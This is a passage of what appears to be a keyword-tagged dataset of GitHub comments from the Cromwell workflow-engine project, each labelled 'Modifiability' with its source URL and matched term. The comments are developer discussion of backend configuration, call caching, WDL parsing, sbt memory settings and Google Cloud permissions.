pump.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2452#issuecomment-345292377:426,config,configuration,426,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2452#issuecomment-345292377,1,['config'],['configuration']
Modifiability,The ownership of those plugins is murky at best. I don't disagree but it's not a black & white thing,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2124#issuecomment-291249221:23,plugin,plugins,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2124#issuecomment-291249221,1,['plugin'],['plugins']
Modifiability,"The regular status polling is totally separate from this option. . Regular polling backs off, so doesn't have a single ""interval"" value to configure or report (ie it starts off polling with short intervals but slows down as the job runs for longer and longer). That's true for all jobs across all backends. The `is-alive` check is a fixed (configurable) duration, and it's the timeout between `is-alive` returning false, and the job being considered failed, that are the same. Does that make sense?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4877#issuecomment-492253707:139,config,configure,139,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4877#issuecomment-492253707,2,['config'],"['configurable', 'configure']"
Modifiability,"The removed `-Xms2g` was saying ""Never run sbt, ever, without less than 2g of memory"". Meanwhile, Intellij has its own ""[Maximum Heap Size](https://www.jetbrains.com/help/idea/sbt.html#82b10b37)"" configuration value for the amount of memory required to import an sbt project. The IDE doesn't use this for running tests, so it does not need to be as large as the sbt options one uses for `sbt test` from the command line. The net effect of having the Intellij maximum less than 2g and the sbt opts _minimum_ at 2g caused a cryptic error of: . ```; Error while importing sbt project:. Error occurred during initialization of VM; Initial heap size set to a larger value than the maximum heap size; ```. This PR still leaves .sbtopts maximum amount of memory for running `sbt test` at 4g. It just no longer states that the JVM should start at 2g of memory.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4476#issuecomment-445947767:196,config,configuration,196,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4476#issuecomment-445947767,1,['config'],['configuration']
Modifiability,The same way we have a configurable `SCRIPT_EPILOGUE` we could introduce a configurable `SCRIPT_PREFACE` 📖 that would execute before the script. If we export the `TMPDIR` variable before `SCRIPT_PREFACE` is run then backend authors could set whatever permissions they want (or none) on the `TMPDIR`.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3721#issuecomment-394428973:23,config,configurable,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3721#issuecomment-394428973,3,"['config', 'variab']","['configurable', 'variable']"
Modifiability,"The silver lining is ; ""If you declare an execution context variable in an actor using `context.dispatcher`, don't make it a lazy val"". I remember removing the lazy in a couple places so I think we can close this and re-open it if it happens again.; The underlying problem still exists in that if an actor starts some work asynchronously and then stops without waiting for it, the asynchronous work might never be acted upon. But this could manifest itself in unpredicatable ways.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2189#issuecomment-316074843:60,variab,variable,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2189#issuecomment-316074843,1,['variab'],['variable']
Modifiability,"The tasks we run tend to have variable memory and storage requirements depending on the dataset we're processing in any given run. It would be nice to be able to set just minimum values and have Cromwell calculate what it should actually request based on ""some logic"" relating to the size of the input -> where the ""some logic"" is the difficult bit of course. For some tasks we have pretty good expectations of how the needs will relate to inputs, eg if I'm just copying over the same data with minor changes, but for others it could be hairy. . Frankly I don't think this should be made a priority, because my naive impression is that it will be really hard to do well, and the result will be a convenience, but nothing earth-shattering. There's a lot of other stuff I would want to have first.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2267#issuecomment-301220265:30,variab,variable,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2267#issuecomment-301220265,1,['variab'],['variable']
Modifiability,"The wheel has selected @scottfrazer as the second reviewer. I would like to enhance or add a test to make sure the `DOCKER_IMAGE_HASH` and `RESULTS_CLONED_FROM` are working, but that shouldn't prevent this review from starting.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/322#issuecomment-165435688:76,enhance,enhance,76,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/322#issuecomment-165435688,1,['enhance'],['enhance']
Modifiability,"Theory 1:; I've also seen this issue. I've set our `concurrent-job-limit` parameter in the backend to 150 and yet the number of concurrent jobs (including those pending) seems to stay at around 60-65. . Could the other 90 be from tasks that still need to be 'ticked off' as complete?. My suspicion on this is that the `check-alive` parameter in the config is set to `squeue -j ${job_id}`.; On our cluster we have around 3 hours to continue running commands like `scontrol show job` to see the metadata on the job and find logs. This is useful but, `squeue -j ${job_id}` still returns true well and truly after the job has completed/failed. Could you try massively increasing the job limit (to say 10000) and see if that changes anything?. Theory 2:; Your configuration file could need a scale up - it may be that the number of system io requests require increasing:. ```; system {; io {; number-of-requests = 100000; per = 100 seconds; number-of-attempts = 50; }; ```. Will allow your job to make 1000 requests per second. For some of those batch calling jobs with many vcf inputs, it may be taking some time for the server to set up the task?. Theory 3:; Your duplication-strategy is causing lag.; Can you confirm that in providers.slurm.filesystems that you have hard-link or soft-link as the top priority for the localization and caching settings, over copying?. Alexis.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5218#issuecomment-554183952:349,config,config,349,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5218#issuecomment-554183952,2,['config'],"['config', 'configuration']"
Modifiability,"There are multiple related issues in this ticket. The common thread is: a WDL author expects to be able to write compound WDL statements in a task `output` section. However, there are certain WDL statements that fail parsing when strung together, but _will_ work if the statement is broken into multiple variables. The original issue identifies problems in `output` using `glob()` or `Map[,]`. In terms of a fix, I'm guessing for the right dev this is a medium<sup>1</sup> sized task, but would probably be lower on the list of TODOs as there exists a workaround. This ""workaround"" works, where all three `output` variables are relatively simple:; ```wdl; task x {; command {; echo 0 > intFile.txt; echo hello > outFile.txt; }; runtime { docker: ""ubuntu"" }; output {; Int intermediateInt = read_int(""intFile.txt""); Array[File] intermediateOuts = glob(""outFile.txt""); File out = intermediateOuts[intermediateInt]; }; }. workflow glob_indexing { call x }; ```. Starting to compress the output block into two statements, where the latter is a compound expression, this still parses and runs:; ```wdl; output {; Int intermediateInt = read_int(""intFile.txt""); File out = glob(""outFile.txt"")[intermediateInt]; }; ```. Regarding the problems with `Map[,]` this _does_ work:; ```wdl; output {; Map[String, File] intermediateMap = {""a"": ""outFile.txt""}; File out = intermediateMap[""a""]; }; ```. HOWEVER, this doesn't work, currently failing with the error `Workflow input processing failed: <string:8:20 lbrace ""ew==""> (of class wdl4s.parser.WdlParser$Terminal)`:. ```wdl; output {; File out = {""a"": ""outFile.txt""}[""a""]; }; ```. And going back to globbing, the error with globs is _slightly_ better. This doesn't work, either:; ```wdl; output {; File out = glob(""outFile.txt"")[read_int(""intFile.txt"")]; }; ```. And fails with the ""prettier"" message at the moment:. ```; ERROR: Unexpected symbol (line 8, col 48) when parsing 'e'. Expected rsquare, got (. File out = glob(""outFile.txt"")[read_int(""intFile.txt"")];",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2698#issuecomment-345410829:304,variab,variables,304,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2698#issuecomment-345410829,2,['variab'],['variables']
Modifiability,"There hasn't unfortunately. This is sort of a desperate thought but maybe you can try to see if you can cache via file path instead of file hash (https://cromwell.readthedocs.io/en/develop/Configuring/#local-filesystem-options). I don't know if its configured to work for AWS but ""hashing-strategy"" could be set to path -- though it may only ever work for the local filesystem and not S3. ```; # Possible values: file, path, path+modtime; # ""file"" will compute an md5 hash of the file content.; # ""path"" will compute an md5 hash of the file path. This strategy will only be effective if the duplication-strategy (above) is set to ""soft-link"",; # in order to allow for the original file path to be hashed.; # ""path+modtime"" will compute an md5 hash of the file path and the last modified time. The same conditions as for ""path"" apply here.; # Default: file; hashing-strategy: ""file""; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4828#issuecomment-581915065:189,Config,Configuring,189,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4828#issuecomment-581915065,2,"['Config', 'config']","['Configuring', 'configured']"
Modifiability,"There is already a relatively heavy conflict between the job_avoidance branch and the ""refactor Engine Fns"" branch that I'm currently rebasing right now. This PR seems simple enough to add to the rebased version though so it shouldn't be too bad. Just please let me know if you modify `GoogleCrendential` on job_avoidance branch @kshakir",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/329#issuecomment-165169137:87,refactor,refactor,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/329#issuecomment-165169137,1,['refactor'],['refactor']
Modifiability,"There's certainly an issue with config and docs, and now that I'm thinking about this more it's possible that with a recent bug fix we might be able to do away with the tee and keep the command stdout/err out of the qsub stdout/err. I'll look into this further.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3705#issuecomment-393154909:32,config,config,32,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3705#issuecomment-393154909,1,['config'],['config']
Modifiability,There's code now on develop that looks at a config value. It's not clear from the discussion above if that's enough to satisfy this ticket?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3340#issuecomment-371703999:44,config,config,44,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3340#issuecomment-371703999,1,['config'],['config']
Modifiability,"These removed calls to `setAccessible` are NOT technically illegal yet. They do not modify [JDK classes](https://openjdk.java.net/jeps/396) and the third-party libraries that are modified at runtime are currently weakly encapsulated. Still, if these libraries suddenly switch to modules then [`setAccessible` will then be illegal](https://docs.oracle.com/javase/9/docs/api/java/lang/reflect/AccessibleObject.html#setAccessible-boolean-). This PR uses alternatives for some of the calls to `setAccesible` in this repo, either through basic refactoring or using new APIs that weren't available back when the original workaround was implemented.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6663#issuecomment-1024960996:539,refactor,refactoring,539,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6663#issuecomment-1024960996,1,['refactor'],['refactoring']
Modifiability,This exists in C22+:; ```; backend {; ...; providers {; BackendName {; actor-factory = ...; config {; concurrent-job-limit = 5; ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1354#issuecomment-276494116:92,config,config,92,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1354#issuecomment-276494116,1,['config'],['config']
Modifiability,This has been added recently for shared file system: https://github.com/broadinstitute/cromwell/blob/90154ed22b2a78dfbb1c5342a8f0d39164aaeac8/docs/Configuring.md#local-filesystem-options,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1843#issuecomment-519641622:147,Config,Configuring,147,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1843#issuecomment-519641622,1,['Config'],['Configuring']
Modifiability,"This is a way to reproduce with `gsutil cp`, as @aednichols suggested (in my case Cromwell runs with service account `30148356615-compute@developer.gserviceaccount.com`):; ```; $ gcloud config set account giulio@broadinstitute.org; Updated property [core/account].; $ gcloud auth list; Credentialed Accounts; ACTIVE ACCOUNT; 30148356615-compute@developer.gserviceaccount.com; giulio.genovese@gmail.com; * giulio@broadinstitute.org. To set the active account, run:; $ gcloud config set account `ACCOUNT`. $ gsutil cp gs://fc-118c254f-010a-4ee6-b149-6f0bb5abaa77/GeneticNeuroscience_McCarroll_CIRM_GRU_Exome_9qCN-LOH_PDO-21129/RP-1875/Exome/CW60141_P13_MT_1-19-18/v1/CW60141_P13_MT_1-19-18.cram.crai /tmp/. Copying gs://fc-118c254f-010a-4ee6-b149-6f0bb5abaa77/GeneticNeuroscience_McCarroll_CIRM_GRU_Exome_9qCN-LOH_PDO-21129/RP-1875/Exome/CW60141_P13_MT_1-19-18/v1/CW60141_P13_MT_1-19-18.cram.crai...; / [1 files][143.2 KiB/143.2 KiB]; Operation completed over 1 objects/143.2 KiB.; $ gcloud config set account 30148356615-compute@developer.gserviceaccount.com; Updated property [core/account].; $ gcloud auth list; Credentialed Accounts; ACTIVE ACCOUNT; * 30148356615-compute@developer.gserviceaccount.com; giulio.genovese@gmail.com; giulio@broadinstitute.org. To set the active account, run:; $ gcloud config set account `ACCOUNT`. $ gsutil cp gs://fc-118c254f-010a-4ee6-b149-6f0bb5abaa77/GeneticNeuroscience_McCarroll_CIRM_GRU_Exome_9qCN-LOH_PDO-21129/RP-1875/Exome/CW60141_P13_MT_1-19-18/v1/CW60141_P13_MT_1-19-18.cram.crai /tmp/; AccessDeniedException: 403 30148356615-compute@developer.gserviceaccount.com does not have storage.objects.list access to the Google Cloud Storage bucket.; ```. So in this case the more appropriate questions would be:; 1) How do I get to have my service account `30148356615-compute@developer.gserviceaccount.com` have the same permissions as my personal account `giulio@broadinstitute.org`?; 2) How do I get Cromwell to run with my personal account `giulio@broadinstit",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665434782:186,config,config,186,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665434782,2,['config'],['config']
Modifiability,"This is also something we would want for our cluster. Users are not allowed to run docker containers on our HPC (that would give them root access :scream:). So we use cromwell on the command line instead. We modified our cromwell configuration to run with singularity containers instead of docker containers. Setting up a MySQL server somewhere is not easy for the average user. Furthermore we used to set up a MySQL server for all users on the cluster, but that meant they had to share a database user and password (they were all using the same configuration). This caused a lot of issues. . Mostly cromwell is run project based. So the call-caching is only interesting for that particular project. Also using a file-based database will automatically ensure that only people with rights to the share the project is on will have access. This is also of importance in a shared cluster environment. At LUMC we currently implement this by using the HSQLDB in-memory database with a persistence file. This has some disadvantages:; 1. Cromwell needs more memory compared to using a MySQL server; 2. The HSQLDB persistence files are huge, badly compressed (when compression is used). 3 GB is normal. Tarring and zipping will get this down to under <50 mb... ; 3. It is slower than using a MySQL server. I think that SQLite will solve problem 1 and 2. (3 is inherent to using a file-based DB). . Having a database is better than to have nothing at all, which is why many users are pining for SQLite. When looking into it I found the option for the persistence file. Although SQLite will be much better, this does not require any extra effort from the Cromwell developers and can already help out a lot of users. I will document how we did this in the Cromwell documentation so everyone can use this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-564437002:230,config,configuration,230,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-564437002,2,['config'],['configuration']
Modifiability,"This is an amazing contribution!. I wonder whether it would be possible to make a single “create all the tables at once, in their latest configuration” migration for Postgres, given that no Cromwell instantiated prior to Postgres support could possibly have a database that needs migrating.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4919#issuecomment-487949926:137,config,configuration,137,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4919#issuecomment-487949926,1,['config'],['configuration']
Modifiability,"This is fixed. On Sep 20, 2017 5:12 PM, ""Kate Voss"" <notifications@github.com> wrote:. > @cjllanwarne <https://github.com/cjllanwarne> I know you just made an; > update to the IntelliJ plugin, did you fix this too?; >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/2276#issuecomment-330982393>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/AAKFyC05-lHHzULkbRCfoBisrrWy8cMvks5skX-jgaJpZM4Nd63a>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2276#issuecomment-330982664:185,plugin,plugin,185,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2276#issuecomment-330982664,1,['plugin'],['plugin']
Modifiability,"This is intended to be a very narrow change to move the ""does this workflow exist"" check from metadata to metadata summaries so the release can go forward. This is deliberately intended to follow existing naming conventions, coding patterns and API structure as much as possible. If anyone feels strongly that these things should be improved there can certainly be enhancement requests.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4617#issuecomment-461526777:365,enhance,enhancement,365,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4617#issuecomment-461526777,1,['enhance'],['enhancement']
Modifiability,"This is not super urgent, but did seem quite simple and I would like to get; it checked in if possible. Let me know what you guys think. On Wed, Dec 16, 2015 at 11:40 AM, Thib notifications@github.com wrote:. > There is already a relatively heavy conflict between the job_avoidance; > branch and the ""refactor Engine Fns"" branch that I'm currently rebasing; > right now. This PR seems simple enough to add to the rebased version though; > so it shouldn't be too bad. Just please let me know if you modify; > GoogleCrendential on job_avoidance branch @kshakir; > https://github.com/kshakir; > ; > —; > Reply to this email directly or view it on GitHub; > https://github.com/broadinstitute/cromwell/pull/329#issuecomment-165169137; > .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/329#issuecomment-165170061:301,refactor,refactor,301,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/329#issuecomment-165170061,1,['refactor'],['refactor']
Modifiability,"This is the standard way to configure cromwell, to provide your own .conf file. Best to start [here](http://cromwell.readthedocs.io/en/stable/tutorials/ConfigurationFiles/)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-413194076:28,config,configure,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-413194076,2,"['Config', 'config']","['ConfigurationFiles', 'configure']"
Modifiability,"This is with the GCP Batch backend correct? Machine Type is a parameter in Batch, but not a parameter in Cromwell. If a machine type is not defined Batch selects the machine type based on the CPU and Memory request. Setting `cpuPlatform` is the way to not get an e series machine. Did you get an e series machine with ""Intel Cascade Lake"" in the configuration?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2252813190:346,config,configuration,346,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2252813190,1,['config'],['configuration']
Modifiability,"This line will allow cromwell to start, but will fail all the workflows on a Local backend:. ```; backend.providers.Local.config.root = ""/dev/null""; ```. Tested on 24_hotfix (489f66b) and develop (b1039f7).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2073#issuecomment-287195148:122,config,config,122,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2073#issuecomment-287195148,1,['config'],['config']
Modifiability,"This looks like a bug to me too - happening because in SGE backend the stdout used by cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.processArgs for job submission (where the SGE job id is written) is the same as the stdout specified to the SGE job itself in qsub. The other sfs implementation cromwell.backend.sfs.BackgroundAsyncJobExecutionActor specifies a different stdout and stderr in makeProcessRunner, suffixed with ""background"", so it doesn't have the same problem.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1512#issuecomment-251564865:112,config,config,112,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1512#issuecomment-251564865,2,"['Config', 'config']","['ConfigAsyncJobExecutionActor', 'config']"
Modifiability,"This memory-related PR enhances #6766. The former addresses portable `command <<< … >>>` blocks (across Cromwell backends) and this PR enables portable more-memory functionality. The prior ""[Side note](https://github.com/broadinstitute/cromwell/pull/6766#issuecomment-1133753430)"" still applies. Instead of changing the existing Papi tests to run on all backends this PR adds (mostly copy/pasted) TES tests. This is because:; 1. As noted the `memory` runtime attribute isn't currently supported by the `Local` backend, and; 2. Other backends like `AWSBATCH` are [mostly disabled](https://github.com/broadinstitute/cromwell/blob/4884f735a7f3bd8863acf763bdac15b76fac9b2a/src/ci/bin/testCentaurAws.sh#L22-L27) in CI.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6909#issuecomment-1250187649:23,enhance,enhances,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6909#issuecomment-1250187649,3,"['enhance', 'portab']","['enhances', 'portable']"
Modifiability,This pull-request may be a little outdated (see conflict). But we're running this at my work. . The solution may need to discussed/documented further as we're essentially introducing another a separate project-id into the configurations.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6225#issuecomment-887630369:222,config,configurations,222,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6225#issuecomment-887630369,1,['config'],['configurations']
Modifiability,"This seems to be interestingly connected with the spec change https://github.com/openwdl/wdl/pull/315 (so cc @patmagee). As that PR is currently written, we would be fine to do the scheme like this, because the `memory` section says ""you can provide as much memory as you want, as long as it's over this amount"", but it feels like we're in danger of writing non-portable WDLs like this because the incentive is to write a small value first and rely on the doubling to catch you if necessary. FWIW I'd rather go down the route of:; - `memory` is treated as the ""guaranteed to work"" ceiling amount; - We could start by having a much lower `memory_to_try_first` attribute representing the first value to try; - If the task fails, we can then double it from the low baseline, until either the task succeeds or we reach the `memory` ceiling, and at that point we don't try any further. Does that make sense?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5017#issuecomment-499235634:362,portab,portable,362,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5017#issuecomment-499235634,1,['portab'],['portable']
Modifiability,"This small change could make it portable on any esoteric distribution / container. > also risks breaking an unknown number of cases that work fine now. Not using env is more ""risky"" in term of portability, as it would be less portable. This is due to unix requirements",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7469#issuecomment-2269916313:32,portab,portable,32,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7469#issuecomment-2269916313,3,['portab'],"['portability', 'portable']"
Modifiability,This sounds like a problem with the backend dispatcher. Would it make sense to add a sleep statement in the config?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-436397631:108,config,config,108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-436397631,1,['config'],['config']
Modifiability,"This tests as working for me at least with release 24; I can specify ""Local"" or my custom ""PBS"" backend (essentially a modified SGE configured backend) in a task `runtime` block and it behaves as expected.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1086#issuecomment-276574494:132,config,configured,132,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1086#issuecomment-276574494,1,['config'],['configured']
Modifiability,"This was a bigger deal in earlier version changes of cromwell. I.e. when; the config files were changing a lot. On Tue, Aug 29, 2017 at 5:42 PM, mcovarr <notifications@github.com> wrote:. > I'm fine with closing this but that might make @LeeTL1220; > <https://github.com/leetl1220> cry.; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/1598#issuecomment-325813025>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ACDXk0OKSOMcQL7wP_sK2qChxr85O6dIks5sdIXLgaJpZM4KbN4n>; > .; >. -- ; Lee Lichtenstein; Broad Institute; 75 Ames Street, Room 8011A; Cambridge, MA 02142; 617 714 8632",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1598#issuecomment-325842825:78,config,config,78,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1598#issuecomment-325842825,1,['config'],['config']
Modifiability,"This was bad naming from the past that only popped up during centaur's auto-retry tests on a PostgreSQL database. The symptoms were centaur was unable to find tables such as `'cromwell_test'.'JOB_KEY_VALUE_ENTRY'`. I named a config key as `db.schema` and was using it to figure out the name of the cromwell database, that are all `cromwell_test` btw. This `db.schema` setting works fine on MariaDB, MySQL, and HsqlDB. Except on PostgreSQL the `schema` is usually `public`: https://www.postgresql.org/docs/12/ddl-schemas.html#DDL-SCHEMAS-PUBLIC. What was happening was that the config path `db` is fed by Slick to HikariCP. https://github.com/slick/slick/blob/v3.3.2/slick/src/main/scala/slick/basic/DatabaseConfig.scala#L102-L103. And the sub-config `schema` is used by HikariCP to feed to the underlying connection as the JDBC schema name. https://github.com/slick/slick/blob/v3.3.2/slick-hikaricp/src/main/scala/slick/jdbc/hikaricp/HikariCPJdbcDataSource.scala#L90. So, centaur setting `db.schema = cromwell_test` was connecting as normal to the `cromwell_test` PostgreSQL database, then HikariCP was also setting the schema to `cromwell_test`, effectively executing `select * from 'cromwell_test'.'SOME_TABLE'` instead of `select * from 'public'.'SOME_TABLE'`. Again, all of this was only in centaur, and only popped up when centaur was trying to retry a failed test.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5469#issuecomment-608951967:225,config,config,225,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5469#issuecomment-608951967,3,['config'],['config']
Modifiability,"This was deliberately ""not allowed"", to try to force people to pass through the inputs and outputs to their workflows (ie so that the interface to a workflow was stable even if extra tasks were added or removed from its internal workings). In other words to encourage:. ```wdl; version 1.0. workflow Test2 {; input {; String? passthrough_text; }. call Echo {; input: text = passthrough_text; }. output {; }; }; ```. This would allow you to swap out the internal call to `Echo` for something else, or rename the call, or add another call after it, or replace the entire workflow itself with a single task, etc, etc... and nobody who's calling `Test2` needs to worry about your internal refactorings. They just `call Test2` and supply the input and are done. Now having said that, I've pretty much changed my mind about this being something to enforce rather than just something to encourage, and would ideally like to go down the route of saying ""best practices are to pass through inputs and outputs but it's not enforced because quite often it's super-annoying""",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4079#issuecomment-420048870:685,refactor,refactorings,685,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4079#issuecomment-420048870,1,['refactor'],['refactorings']
Modifiability,This was done a while back and was intentional as we were coupling two unrelated concepts quite tightly. We were not aware of anyone taking advantage of that functionality so just removed it. It has since come up that there are people out there who **do** like having a mechanism to punch things through to the GCP VM and have discussed adding a new feature to handle that (e.g. a workflow option). Tagging @ruchim,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4692#issuecomment-468718231:58,coupling,coupling,58,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4692#issuecomment-468718231,1,['coupling'],['coupling']
Modifiability,This would be useful to us as well. We have a similar case where we have a large reference collection that we don't want to have to fetch every time. For our now AWS deploys we can override the submit-docker parameter to add the mount. But this isn't exposed for this backend. It would be nice if we could fully customize the docker command similar to what is possible with ConfigBackendLifecycleActorFactory.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4579#issuecomment-754945786:374,Config,ConfigBackendLifecycleActorFactory,374,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4579#issuecomment-754945786,1,['Config'],['ConfigBackendLifecycleActorFactory']
Modifiability,"Those requests are probably a red herring, but I suggest reaching out to us (DSP AppSec) on Slack for those ;). Re the dedicated SA, there're a couple issues with your config:. 1) We typically don't recommend downloading a SA key to a GCP VM, since all GCP VMs normally have a SA associated with them (when you start them). Cromwell will just pick them up automatically ""from the environment"". So please don't download a SA key to it and instead use this as the recommended option, per [Cromwell docs](https://cromwell.readthedocs.io/en/latest/backends/Google/):; ```hcl; {; name = ""application-default""; scheme = ""application_default""; },; ```. I can provide more details from the config I used previously, if this doesn't work. 2) Which SA is `MY-GOOGLE-PROJECT-############.json` for? From your earlier `gcloud projects add-iam-policy-binding` command, it seems like that was for `MY-NUMBER-compute@developer.gserviceaccount.com`, which is the so-called ""Default Compute Service Account"" in your project. Using it is not recommended, since it has pretty wide permissions from the get-go. So I'd recommend creating a separate SA and granting it those roles instead, and then assigning that SA to the Cromwell VM before you start it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-686615315:168,config,config,168,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-686615315,2,['config'],['config']
